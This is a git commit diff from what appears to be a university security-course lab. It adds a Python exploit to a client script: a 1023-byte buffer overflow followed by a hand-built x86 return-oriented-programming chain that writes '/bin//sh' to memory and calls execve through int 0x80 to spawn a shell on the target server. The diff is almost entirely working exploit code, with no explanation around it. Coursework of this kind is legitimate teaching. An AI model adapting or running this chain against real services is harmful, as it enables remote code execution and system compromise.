4703e20fad6ec0d4741e20683ebba80c24360c55
elizabrodr388 <elizabeth.amanda.rodriguez@gmail.com>
2021-05-02 00:54:44 -0400

    Progress on task 1.

--- 2021sp_cs361s/labs/lab4/local.py
+++ 2021sp_cs361s/labs/lab4/local.py
@@ -30,8 +30,46 @@ def send_cmd(cmd):
     sock.close()
     sys.stdout.write(buf.decode('utf-8'))
 
-send_cmd("PUT SECRET p455w0rd! Secret value\r\n")
-send_cmd("GET SECRET password1\r\n")
-send_cmd("GET SECRET p455w0rd!\r\n")
+# send_cmd("PUT SECRET p455w0rd! Secret value\r\n")
+# send_cmd("GET SECRET password1\r\n")
+# send_cmd("GET SECRET p455w0rd!\r\n")
+
+p = pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139060) # @ .data
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += b'/bin'
+p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139064) # @ .data + 4
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += b'//sh'
+p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139068) # @ .data + 8
+p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
+p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080481e1) # pop ebx ; ret
+p += pack('<I', 0x08139060) # @ .data
+p += pack('<I', 0x0812b35b) # pop ecx ; ret
+p += pack('<I', 0x08139068) # @ .data + 8
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139068) # @ .data + 8
+p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x08074ded) # int 0x80
+
+send_cmd("A"*1023)
+time.sleep(1)
+send_cmd(p)
 
 # :vim set sw=4 ts=8 sts=8 expandtab:
